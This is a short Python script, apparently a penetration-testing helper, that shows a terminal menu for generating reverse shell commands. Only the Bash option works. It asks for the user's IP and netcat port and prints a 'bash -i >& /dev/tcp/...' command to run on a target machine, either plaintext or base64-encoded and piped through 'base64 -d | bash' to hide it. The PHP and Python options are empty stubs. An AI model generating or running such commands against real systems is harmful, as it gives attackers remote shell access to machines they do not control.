from simple_term_menu import TerminalMenu
import base64

def main_menu():
    options = ["Bash", "PHP", "Python", "Exit"]

    main_menu = TerminalMenu(options, title="--- Select a reverse shell type ---")
    menu_entry_index = main_menu.show()

    if menu_entry_index is None:
        print("No option selected. Exiting.")
        return

    selected_option = options[menu_entry_index]

    if selected_option == "Exit":
        print("Exiting the script.")
        return

    if selected_option == "Bash":
        bash_reverse_shell()
    
    elif selected_option == "PHP":
        php_reverse_shell()
    
    elif selected_option == "Python":
        python_reverse_shell()

def bash_reverse_shell():
    bash_options = ["Encrypted Bash", "Plaintext Bash", "Back to Main Menu"]
    bash_menu = TerminalMenu(bash_options, title="--- Select a Bash reverse shell type ---")
    bash_menu_entry_index = bash_menu.show()

    if bash_menu_entry_index is None:
        print("No option selected. Returning to main menu.")
        main_menu()

    selected_bash_option = bash_options[bash_menu_entry_index]

    if selected_bash_option == "Back to Main Menu":
        main_menu()

    elif selected_bash_option == "Encrypted Bash":
        print("You selected Encrypted Bash reverse shell.")
        local_ip = input("Enter your IP address: ")
        local_port = input("Enter the port netcat will be listening (tipically 4444): ")
        command = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
        command_bytes = command.encode('ascii')
        base64_bytes = base64.b64encode(command_bytes)
        #We finally obtain the base64 encoded command as a string
        base64_command = base64_bytes.decode('ascii')
        print(f"Command to execute on target machine: echo {base64_command} | base64 -d | bash")

    elif selected_bash_option == "Plaintext Bash":
        print("You selected Plaintext Bash reverse shell.")
        local_ip = input("Enter your IP address: ")
        local_port = input("Enter the port netcat will be listening (tipically 4444): ")
        command = f"bash -i >& /dev/tcp/{local_ip}/{local_port} 0>&1"
        print(f"Command to execute on target machine: {command}")
        

def php_reverse_shell():
    # Implement your PHP reverse shell logic here
    pass

def python_reverse_shell():
    # Implement your Python reverse shell logic here
    pass


if __name__ == "__main__":
    main_menu()
